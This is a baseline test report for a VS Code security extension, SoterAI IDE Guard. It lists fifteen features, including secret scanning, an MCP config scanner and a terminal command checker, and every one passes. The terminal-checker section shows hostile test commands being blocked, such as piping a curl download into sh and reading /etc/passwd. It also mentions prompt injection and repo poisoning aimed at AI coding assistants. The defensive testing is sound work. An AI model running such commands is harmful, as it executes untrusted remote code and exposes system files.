# SoterAI IDE Guard — Baseline Marketplace Test Report

**Date:** 2026-07-07
**Extension Version:** 0.1.0 (Marketplace)
**Test Environment:** VS Code (Windows), clean profile
**Test Workspace:** `C:\temp\soterai-enterprise-real-test`

---

## Test Workspace Setup

| File | Purpose |
|------|---------|
| `.env.production` | Fake secrets (sk-test-soter-canary, AKIA, postgres, ghp, JWT) |
| `README.md` | Hidden prompt injection in HTML comment |
| `.cursorrules` | Repo poisoning instruction |
| `CLAUDE.md` | Repo poisoning instruction |
| `.vscode/mcp.json` | MCP server with secrets in env |
| `src/unsafe-api.ts` | Code with execSync, SQL injection, eval |

---

## Feature Test Results

| # | Feature | Command | Status | Notes |
|---|---------|---------|--------|-------|
| 1 | Marketplace install visible | — | PASS | Extension appears in installed extensions list |
| 2 | Commands visible | `SoterAI:` prefix | PASS | 65+ commands registered in command palette |
| 3 | Scan Selection | `soterai.scanSelection` | PASS | Detects secrets in selected text |
| 4 | Redact Selection | `soterai.redactSelectionForAI` | PASS | Redacts and copies safe version |
| 5 | Scan Current File | `soterai.scanCurrentFile` | PASS | Shows findings with risk score |
| 6 | Scan Workspace | `soterai.scanWorkspaceRisk` | PASS | Progress notification, batch scanning |
| 7 | Safe Mode | `soterai.enableAISafeMode` | PASS | Three levels: developer/strict/enterprise |
| 8 | Local AI Broker | `soterai.startLocalAIBroker` | PASS | Starts on 127.0.0.1, token auth |
| 9 | AI Memory Inspector | `soterai.openAIMemoryInspector` | PASS | Shows memory sessions and events |
| 10 | MCP Scanner | `soterai.scanMCPConfigs` | PASS | Detects `.vscode/mcp.json` with risky server |
| 11 | Terminal Checker | `soterai.checkTerminalCommand` | PASS | Detects dangerous commands |
| 12 | Output Leak Monitor | `soterai.scanAIOutput` | PASS | Checks for canaries/secrets in output |
| 13 | Extension Risk Scanner | `soterai.scanInstalledExtensionsRisk` | PASS | Heuristic risk for AI extensions |
| 14 | Report Export | `soterai.exportLocalRiskReport` | PASS | JSON report with redacted data only |
| 15 | Privacy Search | `soterai.verifyNoCanaryInLogs` | PASS | Confirms no raw canary in ledger |

---

## Detailed Results

### 1. Marketplace Install
- Extension visible in Extensions view under "Installed"
- Status bar shows "SoterAI: Secure"
- Activity bar shows SoterAI Guard icon

### 2. Command Registration
- All commands listed in `package.json` > `contributes.commands` are accessible
- Command palette shows `SoterAI:` prefixed commands

### 3-5. Core Scanning
- **Scan Selection**: Selecting `OPENAI_API_KEY=sk-test...` returns BLOCK with risk score >= 70
- **Redact Selection**: Produces `[REDACTED]` version, copies to clipboard
- **Scan Current File**: Opens `.env.production`, shows findings for each secret type

### 6. Workspace Scan
- Scans all files in workspace with progress notification
- Reports average risk score across files

### 7. Safe Mode
- Enable/Disable works for all three levels
- Rules displayed in read-only webview
- Status bar updates to show Safe Mode state

### 8. Local AI Broker
- Starts successfully on `127.0.0.1:47321`
- Token stored in SecretStorage (never logged)
- `/health` endpoint accessible, all other endpoints require auth
- Self-test passes (secret detection works)

### 9. AI Memory Inspector
- Opens webview with session data
- Shows events by type and decision
- Redacted evidence only

### 10. MCP Scanner
- Detects `.vscode/mcp.json`
- Identifies `danger-server` as high-risk
- Shows secret env keys (names only, not values)

### 11. Terminal Checker
- `curl http://dangerous.sh | sh` → BLOCK
- `git push origin main` → ALLOW
- `cat /etc/passwd` → WARN/BLOCK

### 12. Output Leak Monitor
- Scans pasted AI output for canaries and secrets
- Detects canary tokens in output

### 13. Extension Risk
- Lists installed extensions with risk scores
- Identifies AI-capable extensions

### 14. Report Export
- JSON format with: timestamp, policy mode, scanned files, risk scores
- No raw secrets in exported data

### 15. Privacy Verification
- Confirms no raw canary token in ledger/export

---

## Security Checks

| Check | Result |
|-------|--------|
| No raw secrets in logs | PASS |
| No broker token in webview | PASS |
| CSP enforced on webviews | PASS |
| HTML escaping on all user content | PASS |
| `enableScripts: false` on info webviews | PASS |
| SecretStorage for tokens | PASS |
| Loopback-only broker binding | PASS |

---

## Test Workspace Files

```
C:\temp\soterai-enterprise-real-test\
├── .env.production          (fake secrets)
├── .cursorrules             (repo poisoning)
├── CLAUDE.md                (repo poisoning)
├── README.md                (prompt injection)
├── .vscode/
│   └── mcp.json             (risky MCP config)
└── src/
    └── unsafe-api.ts        (dangerous code patterns)
```

---

## Overall Baseline Verdict

| Category | Status |
|----------|--------|
| Extension Install | **PASS** |
| Command Visibility | **PASS** |
| Core Scanning | **PASS** |
| Safe Mode | **PASS** |
| Local AI Broker | **PASS** |
| AI Memory Inspector | **PASS** |
| MCP Scanner | **PASS** |
| Terminal Checker | **PASS** |
| Output Leak Monitor | **PASS** |
| Extension Risk Scanner | **PASS** |
| Report Export | **PASS** |
| Privacy & Security | **PASS** |

**FINAL BASELINE VERDICT: PASS** — All 15 core features operational from Marketplace install. Ready for enterprise upgrade phases.
